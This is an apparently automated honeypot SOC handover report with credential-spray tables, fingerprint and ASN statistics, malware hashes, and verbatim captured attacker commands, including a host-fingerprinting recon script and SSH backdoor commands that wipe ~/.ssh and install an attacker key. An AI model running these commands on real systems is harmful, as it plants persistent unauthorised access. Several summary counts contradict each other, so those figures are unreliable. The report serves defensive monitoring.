# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-24 |
| **Generated At** | 2026-08-24T22:31:59Z |
| **Shift Time** | 22:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **144** |
| Confirmed Threats | **0** |
| False Positives Filtered | **144** (100.0%) |
| Unique Attacker IPs | **71** |
| Countries of Origin | **0** |
| High Severity Cases | **80** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **64** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **104** |
| Unique Credential Pairs | **58** |
| Unique Usernames | **11** |
| Unique Passwords | **58** |
| Successful Auth Pairs | **88** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `admin` | 14 |
| `user` | 14 |
| `ubuntu` | 13 |
| `support` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `2222` | 6 |
| `888` | 6 |
| `444444` | 6 |
| `config999` | 5 |
| `supervisor888` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `2222` | 6 |
| `admin` | `888` | 6 |
| `user` | `444444` | 6 |
| `config` | `config999` | 5 |
| `supervisor` | `supervisor888` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `3333` | `185.255.212.178` | 2026-08-24T18:57:33 |
| `admin` | `3333` | `111.70.23.231` | 2026-08-24T18:57:42 |
| `admin` | `3333` | `221.120.57.125` | 2026-08-24T18:57:45 |
| `ubuntu` | `Hossein@2025` | `217.60.255.130` | 2026-08-24T18:57:51 |
| `admin` | `3333` | `110.164.201.73` | 2026-08-24T18:57:53 |
| `root` | `123456Qq` | `217.60.255.130` | 2026-08-24T18:57:55 |
| `ubnt` | `ubnt333` | `10.0.0.73` | 2026-08-24T19:03:12 |
| `ubuntu` | `Karimi123` | `217.60.255.130` | 2026-08-24T19:07:36 |
| `root` | `password1@` | `217.60.255.130` | 2026-08-24T19:07:39 |
| `support` | `2222` | `10.0.0.73` | 2026-08-24T19:12:00 |
| `ubuntu` | `Afshin@123` | `217.60.255.130` | 2026-08-24T19:16:59 |
| `root` | `lol` | `217.60.255.130` | 2026-08-24T19:17:03 |
| `user` | `77777` | `45.170.50.2` | 2026-08-24T19:18:08 |
| `user` | `77777` | `124.239.129.2` | 2026-08-24T19:18:20 |
| `ubnt` | `ubnt333` | `45.187.33.152` | 2026-08-24T19:19:24 |
| `ubnt` | `ubnt333` | `199.7.163.33` | 2026-08-24T19:19:32 |
| `config` | `config999` | `112.28.153.238` | 2026-08-24T19:24:28 |
| `config` | `config999` | `155.212.17.174` | 2026-08-24T19:24:35 |
| `ubuntu` | `Amir@2025` | `217.60.255.130` | 2026-08-24T19:26:40 |
| `root` | `windows123` | `217.60.255.130` | 2026-08-24T19:26:44 |
| `support` | `support` | `176.53.159.196` | 2026-08-24T19:27:55 |
| `support` | `2222` | `181.119.64.79` | 2026-08-24T19:29:20 |
| `support` | `2222` | `81.228.174.248` | 2026-08-24T19:29:30 |
| `support` | `2222` | `93.118.169.27` | 2026-08-24T19:29:33 |
| `support` | `2222` | `81.215.2.43` | 2026-08-24T19:29:37 |
| `user` | `333333` | `10.0.0.73` | 2026-08-24T19:33:53 |
| `config` | `config999` | `10.0.0.73` | 2026-08-24T19:35:18 |
| `user` | `333333` | `222.99.52.202` | 2026-08-24T19:35:25 |
| `user` | `333333` | `34.146.217.105` | 2026-08-24T19:35:38 |
| `ubuntu` | `Saeed123` | `217.60.255.130` | 2026-08-24T19:36:27 |
| `root` | `123456aA@` | `217.60.255.130` | 2026-08-24T19:36:31 |
| `debian` | `debian11` | `10.0.0.73` | 2026-08-24T19:44:04 |
| `ubuntu` | `Pouyan@123` | `217.60.255.130` | 2026-08-24T19:46:00 |
| `root` | `Vietnam1` | `217.60.255.130` | 2026-08-24T19:46:05 |
| `user` | `333333` | `2.184.236.166` | 2026-08-24T19:50:58 |
| `config` | `config999` | `171.244.40.247` | 2026-08-24T19:51:26 |
| `support` | `support` | `10.0.0.73` | 2026-08-24T19:52:39 |
| `student4` | `student4@123` | `51.77.158.34` | 2026-08-24T19:54:56 |
| `345gs5662d34` | `345gs5662d34` | `51.77.158.34` | 2026-08-24T19:54:59 |
| `student4` | `3245gs5662d34` | `51.77.158.34` | 2026-08-24T19:54:59 |
| `ubuntu` | `adminroot` | `217.60.255.130` | 2026-08-24T19:55:42 |
| `root` | `Passw0rd!` | `217.60.255.130` | 2026-08-24T19:55:46 |
| `admin` | `888` | `117.177.235.249` | 2026-08-24T19:56:22 |
| `admin` | `888` | `75.64.135.45` | 2026-08-24T19:56:32 |
| `debian` | `debian11` | `166.130.176.136` | 2026-08-24T20:01:45 |
| `ubuntu` | `Rasekh123` | `217.60.255.130` | 2026-08-24T20:05:30 |
| `root` | `P4ssw0rd` | `217.60.255.130` | 2026-08-24T20:05:34 |
| `supervisor` | `supervisor888` | `10.0.0.73` | 2026-08-24T20:06:25 |
| `admin` | `888` | `10.0.0.73` | 2026-08-24T20:07:17 |
| `supervisor` | `supervisor888` | `45.187.33.152` | 2026-08-24T20:07:55 |
| `supervisor` | `supervisor888` | `124.239.129.2` | 2026-08-24T20:08:08 |
| `ubuntu` | `Ashkan@123` | `217.60.255.130` | 2026-08-24T20:15:05 |
| `root` | `abc` | `217.60.255.130` | 2026-08-24T20:15:08 |
| `user` | `444444` | `10.0.0.73` | 2026-08-24T20:16:12 |
| `supervisor` | `supervisor888` | `111.70.32.49` | 2026-08-24T20:23:31 |
| `admin` | `888` | `61.37.150.6` | 2026-08-24T20:23:36 |
| `supervisor` | `supervisor888` | `14.97.77.182` | 2026-08-24T20:23:39 |
| `admin` | `888` | `220.189.253.198` | 2026-08-24T20:23:45 |
| `ubuntu` | `Sepehr@123` | `217.60.255.130` | 2026-08-24T20:24:52 |
| `root` | `long@123` | `217.60.255.130` | 2026-08-24T20:24:57 |
| `root` | `qwertyui` | `77.90.185.20` | 2026-08-24T20:26:53 |
| `admin` | `33` | `63.42.190.239` | 2026-08-24T20:28:39 |
| `admin` | `33` | `217.149.191.246` | 2026-08-24T20:28:46 |
| `user` | `444444` | `31.173.66.222` | 2026-08-24T20:33:34 |
| `user` | `444444` | `186.179.80.12` | 2026-08-24T20:33:43 |
| `user` | `444444` | `115.68.133.201` | 2026-08-24T20:33:46 |
| `root` | `111111` | `92.118.39.77` | 2026-08-24T20:34:13 |
| `ubuntu` | `Aa@1234567` | `217.60.255.130` | 2026-08-24T20:34:35 |
| `root` | `Password123@` | `217.60.255.130` | 2026-08-24T20:34:38 |
| `root` | `123` | `92.118.39.77` | 2026-08-24T20:36:19 |
| `root` | `﻿------fuck------` | `4.172.218.10` | 2026-08-24T20:37:55 |
| `root` | `123123` | `92.118.39.77` | 2026-08-24T20:38:24 |
| `admin` | `33` | `10.0.0.73` | 2026-08-24T20:39:40 |
| `root` | `123321` | `92.118.39.77` | 2026-08-24T20:40:29 |
| `user` | `333` | `58.17.128.7` | 2026-08-24T20:40:29 |
| `user` | `333` | `117.223.152.94` | 2026-08-24T20:40:37 |
| `root` | `1234` | `92.118.39.77` | 2026-08-24T20:42:29 |
| `ubuntu` | `Iran@1404` | `217.60.255.130` | 2026-08-24T20:44:09 |
| `root` | `Asdf$1234` | `217.60.255.130` | 2026-08-24T20:44:10 |
| `root` | `12345` | `92.118.39.77` | 2026-08-24T20:44:29 |
| `root` | `ubuntu` | `183.23.182.4` | 2026-08-24T20:48:14 |
| `supervisor` | `supervisor2025` | `10.0.0.73` | 2026-08-24T20:48:19 |
| `root` | `1234567` | `92.118.39.77` | 2026-08-24T20:48:19 |
| `root` | `12345678` | `92.118.39.77` | 2026-08-24T20:50:14 |
| `root` | `123456789` | `92.118.39.77` | 2026-08-24T20:52:10 |
| `root` | `1234abcd` | `92.118.39.77` | 2026-08-24T20:54:08 |
| `ubuntu` | `Rastegar@2024` | `217.60.255.130` | 2026-08-24T20:54:43 |
| `root` | `Abc123!@#` | `217.60.255.130` | 2026-08-24T20:54:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **144** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 37 |
| OpenSSH | 36 |
| Go SSH scanner | 19 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 36 | 33 |
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 11 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 36 | 33 | Mirai/variant |
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 11 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 10 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `51.77.158.34`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h
```
Source IPs: `77.90.185.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **71** |
| Unique ASNs | **56** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 4 | LOW |
| `AS58224` | Iran Telecommunication Company PJS | 3 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS17421` | Mobile Business Group | 3 | LOW |
| `AS3301` | Telia Company AB | 2 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | LOW |
| `AS47890` | UNMANAGED LTD | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 93 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 80 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 11 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 11 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 10 |

---

## 🔕 False Positive Summary (144 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 144 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 144 cases |
| Tool 34  | Credential Extractor        | ✅ 104 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 71 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 144 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-24T22:31:59Z_
